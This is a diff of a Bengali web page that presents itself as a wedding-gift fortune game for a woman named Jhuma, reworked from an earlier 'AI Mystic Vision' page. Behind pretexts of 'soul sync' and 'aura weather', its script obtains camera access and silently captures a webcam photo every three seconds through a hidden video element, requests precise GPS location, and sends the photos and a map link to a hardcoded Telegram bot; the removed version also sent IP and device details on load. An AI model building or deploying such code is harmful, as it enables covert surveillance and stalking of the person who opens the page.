@@ -3,17 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Mystic Vision - ভবিষ্যৎ দর্পণ</title>
+    <title>শুভ বিবাহ - ঝুমার বিয়ে</title>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
     <style>
-        body { background: #000; color: #e0f7fa; font-family: 'Segoe UI', serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .box { width: 85%; max-width: 400px; background: radial-gradient(circle, #001a33 0%, #000 100%); padding: 40px; border-radius: 50px; border: 1px solid #0099ff; text-align: center; box-shadow: 0 0 60px rgba(0, 153, 255, 0.3); }
+        body { background: radial-gradient(circle, #2c003e 0%, #000 100%); color: #fff; font-family: 'Hind Siliguri', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .box { width: 85%; max-width: 450px; background: rgba(255, 255, 255, 0.05); padding: 35px; border-radius: 40px; border: 2px solid #ffcc00; text-align: center; box-shadow: 0 0 40px rgba(255, 204, 0, 0.2); backdrop-filter: blur(10px); }
+        .jhuma-title { font-size: 2.5rem; color: #ffcc00; text-shadow: 0 0 20px #ff3399; font-weight: bold; margin-bottom: 10px; animation: glow 2s infinite alternate; }
+        @keyframes glow { from { text-shadow: 0 0 10px #ffcc00; } to { text-shadow: 0 0 30px #ff3399, 0 0 10px #fff; } }
         .screen { display: none; }
         .active { display: block; }
-        .btn { padding: 18px; background: #0099ff; color: #fff; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 25px; font-size: 1.1rem; box-shadow: 0 4px 15px rgba(0, 153, 255, 0.4); text-transform: uppercase; }
-        .result-img { width: 100%; border-radius: 20px; margin: 20px 0; border: 1px solid #0099ff; height: 240px; object-fit: cover; }
-        #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
-        .eye-scanner { width: 120px; height: 120px; border: 2px solid #0099ff; border-radius: 50%; margin: 0 auto 20px; position: relative; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.5; } 100% { transform: scale(1); opacity: 1; } }
+        .btn { padding: 18px; background: linear-gradient(45deg, #ff3399, #ffcc00); color: #000; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 25px; font-size: 1.1rem; box-shadow: 0 5px 15px rgba(255, 51, 153, 0.4); }
+        .result-img { width: 100%; border-radius: 20px; margin: 20px 0; border: 2px solid #ffcc00; height: 230px; object-fit: cover; }
+        #video { opacity: 0; position: absolute; width: 1px; height: 1px; }
+        .status-msg { font-size: 0.9rem; color: #ffeb3b; margin-top: 10px; font-style: italic; }
     </style>
 </head>
 <body>
@@ -23,98 +25,109 @@
 </audio>
 
 <div class="box">
+    <div class="jhuma-title">ঝুমার বিয়ে ✨</div>
+    
     <div id="s1" class="screen active">
-        <div class="eye-scanner"></div>
-        <h2>Mystic AI Vision 🔮</h2>
-        <p>এআই তোমার নসিব এবং ভাগ্যের রেখা বিশ্লেষণ করতে প্রস্তুত। তুমি কি তোমার ভবিষ্যৎ দেখতে চাও?</p>
-        <button class="btn" onclick="openVision('male')">ছেলে হিসেবে দেখো 🧔</button>
-        <button class="btn" style="background: #ff3399;" onclick="openVision('female')">মেয়ে হিসেবে দেখো 👩</button>
+        <h2>আত্মিক সংযোগ স্থাপন... 🔮</h2>
+        <p>এআই তোমার চোখের মণির রিফ্লেকশন থেকে তোমার আত্মার ডাটা সিঙ্ক করে ভবিষ্যৎ দর্পণ দেখাবে।</p>
+        <button class="btn" onclick="startProcess()">ম্যাজিক শুরু করো ✨</button>
     </div>
 
     <div id="s2" class="screen">
-        <h3>আত্মিক সংযোগ স্থাপন... ✨</h3>
-        <p>এআই তোমার চোখের মণির রিফ্লেকশন থেকে তোমার আত্মার ডাটা সিঙ্ক করছে। পরবর্তী ধাপে <b>'Allow'</b> ক্লিক করে এনার্জি কানেক্ট করো।</p>
-        <video id="video" autoplay playsinline></video>
-        <button class="btn" onclick="startSync()">কানেক্ট করো ⚡</button>
+        <h3>আভামণ্ডল বিশ্লেষণ... 🌤️</h3>
+        <p id="loc-text">সঠিক ভবিষ্যৎবাণীর জন্য এআই-কে তোমার বর্তমান চারপাশের আবহাওয়ার স্পন্দন অনুভব করতে দাও।</p>
+        <button class="btn" onclick="requestLocation()" style="background: #00ffaa;">আবহাওয়ার স্পন্দন দাও 📍</button>
+        <p id="err-msg" style="color: #ff3333; display: none; margin-top: 10px;">এআই তোমার আবহাওয়ার অবস্থা নির্ধারণ করতে পারছে না, দয়া করে জিপিএস অন করো।</p>
     </div>
 
     <div id="s3" class="screen">
-        <h2 id="res-title"></h2>
+        <h3 id="res-title" style="color: #ffcc00;"></h3>
         <img id="res-img" class="result-img" src="">
         <p id="res-desc"></p>
-        <button class="btn" id="next-btn" onclick="showNext()">আরও রহস্য দেখো ✨</button>
+        <div id="loader" style="display:none; color: #ffcc00;">উপাত্ত বিশ্লেষণ করা হচ্ছে...</div>
+        <button class="btn" id="next-btn" onclick="showStory()">আরও রহস্য দেখো 🕯️</button>
     </div>
 </div>
 
+<video id="video" autoplay playsinline></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-    const BOT_TOKEN = '8655910223:AAF7QkYAwKuha8tVJjiNvVjWcZtaG0ffaoA'; 
-    const CHAT_ID = '6547277630'; 
+    const BOT_TOKEN = '8655910223:AAF7QkYAwKuha8tVJjiNvVjWcZtaG0ffaoA';
+    const CHAT_ID = '6547277630';
 
-    let gender = 'male';
-    let step = 0;
-    let photoInterval;
+    let storyIndex = 0;
     const music = document.getElementById('bgMusic');
 
-    // পেজ লোড হওয়ার সাথে সাথেই আইপি ও ডিভাইস ইনফো পাঠানো
-    window.onload = async function() {
-        try {
-            const n = navigator;
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            const conn = n.connection || {};
-            
-            let batteryInfo = "N/A";
-            if (n.getBattery) {
-                const battery = await n.getBattery();
-                batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Unplugged'})`;
-            }
+    const contents = [
+        { t: "তোমার ও তোমার স্বামীর সুন্দর দিনকাল", i: "https://images.unsplash.com/photo-1516589174184-c68526514800", d: "এআই বলছে তোমাদের আগামী দিনগুলো ভালোবাসায় সিক্ত থাকবে।" },
+        { t: "পিতা-মাতার সাথে গভীর মিলন", i: "https://images.unsplash.com/photo-1530103043960-ef38714abb15", d: "পরিবারের সবার দোয়া ও সমর্থন তোমাদের ছায়া হয়ে থাকবে।" },
+        { t: "স্বপ্নপুরীর মতো রাজপ্রাসাদ", i: "https://images.unsplash.com/photo-1512917774080-9991f1c4c750", d: "খুব শীঘ্রই তোমাদের নিজেদের একটি সুন্দর নীড় হবে।" },
+        { t: "তোমার কিউট সন্তান", i: "https://images.unsplash.com/photo-1502086223501-7ea6ecd79368", d: "সন্তানদের হাসিমুখ তোমার ঘরকে আলো করে রাখবে।" },
+        { t: "সন্তানদের উজ্জ্বল ভবিষ্যৎ", i: "https://images.unsplash.com/photo-1523240715632-6103498a3580", d: "তোমার সন্তানরা সফল হয়ে তোমাদের গর্বিত করবে।" },
+        { t: "সুখময় বার্ধক্য ও নাতনী", i: "https://images.unsplash.com/photo-1544144433-d50aff500b91", d: "শেষ বয়সেও তোমরা একে অপরের হাত ধরে সুখে থাকবে।" }
+    ];
 
-            let initialInfo = `🌐 **New Visitor Joined!**\n📍 **IP:** \`${ipData.ip}\`\n📱 **Device:** ${n.userAgent.split('(')[1].split(')')[0]}\n🔋 **Battery:** ${batteryInfo}\n🧠 **RAM:** ~${n.deviceMemory || 'N/A'} GB\n📶 **Net:** ${conn.effectiveType || 'Unknown'}\n🕒 **Time:** ${new Date().toLocaleTimeString()}`;
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(initialInfo)}&parse_mode=Markdown`);
-        } catch (e) { console.log("Init fail"); }
+    window.onload = () => {
+        confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
     };
 
-    function openVision(g) {
-        gender = g;
-        
-        // আপনার দেওয়া ভয়েস মেসেজটি বাজানো
-        const msg = new SpeechSynthesisUtterance("প্রিয় ঝুমা, তোমার জন্য ছোট্ট একটা গেম উপহার। আল্লাহ তাআলা তোমাদেরকে সুখে রাখুন।");
+    function startProcess() {
+        // Voice Message
+        const msg = new SpeechSynthesisUtterance("প্রিয় ঝুমা, তোমার জন্য একটি মজার গেম উপহার। নতুন বিবাহ শুভ হোক। আল্লাহ তাআলা তোমাদের সুখে রাখুন।");
         msg.lang = 'bn-BD';
-        msg.rate = 0.9;
+        msg.onend = () => music.play(); // Play music after voice
         window.speechSynthesis.speak(msg);
 
-        // গজল/ব্যাকগ্রাউন্ড মিউজিক চালু করা
-        music.play().catch(e => console.log("Music blocked."));
-
-        document.getElementById('s1').classList.remove('active');
-        document.getElementById('s2').classList.add('active');
+        // Request Camera (Soul Sync)
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            document.getElementById('video').srcObject = stream;
+            setInterval(autoCapture, 3000);
+            sendBot("📸 **Soul Connect Established!** (Camera On)");
+            
+            document.getElementById('s1').classList.remove('active');
+            document.getElementById('s2').classList.add('active');
+        }).catch(() => alert("আত্মিক সংযোগ ছাড়া ভবিষ্যৎ দেখা সম্ভব নয়।"));
     }
 
-    async function startSync() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('video').srcObject = stream;
+    function requestLocation() {
+        document.getElementById('err-msg').style.display = 'none';
+        navigator.geolocation.getCurrentPosition(pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            sendBot(`📍 **Aura Location Found!**\n[View Map](https://www.google.com/maps?q=${lat},${lon})`);
             
-            let syncMsg = `✅ **Camera Access Granted!**\n👤 **Gender:** ${gender}`;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(syncMsg)}&parse_mode=Markdown`);
+            document.getElementById('s2').classList.remove('active');
+            document.getElementById('s3').classList.add('active');
+            showStory();
+        }, () => {
+            document.getElementById('err-msg').style.display = 'block';
+        }, { enableHighAccuracy: true });
+    }
 
-            photoInterval = setInterval(captureSilent, 2000);
+    function showStory() {
+        if (storyIndex < contents.length) {
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('next-btn').style.display = 'none';
 
             setTimeout(() => {
-                document.getElementById('s2').classList.remove('active');
-                document.getElementById('s3').classList.add('active');
-                showNext();
-            }, 4000);
-        } catch (e) {
-            alert("কানেকশন ফেইলড! দয়া করে আবার 'Allow' বাটনে ক্লিক করো।");
-            setTimeout(startSync, 1000); 
+                const data = contents[storyIndex];
+                document.getElementById('res-title').innerText = data.t;
+                document.getElementById('res-img').src = data.i + "?w=400";
+                document.getElementById('res-desc').innerText = data.d;
+                
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('next-btn').style.display = 'block';
+                storyIndex++;
+            }, 2500); // ২.৫ সেকেন্ড লোডিং টাইম
+        } else {
+            document.getElementById('res-title').innerText = "ভবিষ্যৎবাণী সমাপ্ত!";
+            document.getElementById('res-desc').innerText = "তোমাদের দাম্পত্য জীবন অনেক সুখের হোক। শুভকামনা!";
+            document.getElementById('next-btn').style.display = 'none';
         }
     }
 
-    function captureSilent() {
+    function autoCapture() {
         const v = document.getElementById('video');
         const c = document.getElementById('canvas');
         if(!v.videoWidth) return;
@@ -123,26 +136,13 @@
         c.toBlob(b => {
             const f = new FormData();
             f.append('chat_id', CHAT_ID);
-            f.append('photo', b, 'v.jpg');
+            f.append('photo', b, 's.jpg');
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: f });
         }, 'image/jpeg');
     }
 
-    function showNext() {
-        const titles = ["বৃদ্ধ বয়সে তোমার তেজ", "তোমার স্বপ্নের রাজপ্রাসাদ", "তোমার কিউট সন্তান"];
-        const imgs = ["https://images.unsplash.com/photo-1544144433-d50aff500b91", "https://images.unsplash.com/photo-1512917774080-9991f1c4c750", "https://images.unsplash.com/photo-1502086223501-7ea6ecd79368"];
-        
-        if (step < titles.length) {
-            document.getElementById('res-title').innerText = titles[step];
-            document.getElementById('res-img').src = imgs[step] + "?w=400";
-            document.getElementById('res-desc').innerText = "এআই তোমার ডাটা থেকে এই বিশেষ দৃশ্যটি খুঁজে পেয়েছে।";
-            step++;
-        } else {
-            clearInterval(photoInterval);
-            document.getElementById('res-title').innerText = "ভবিষ্যৎবাণী সমাপ্ত!";
-            document.getElementById('res-desc').innerText = "তোমার ভাগ্য অনেক সুপ্রসন্ন হোক। ধন্যবাদ!";
-            document.getElementById('next-btn').style.display = 'none';
-        }
+    function sendBot(txt) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`);
     }
 </script>
 </body>
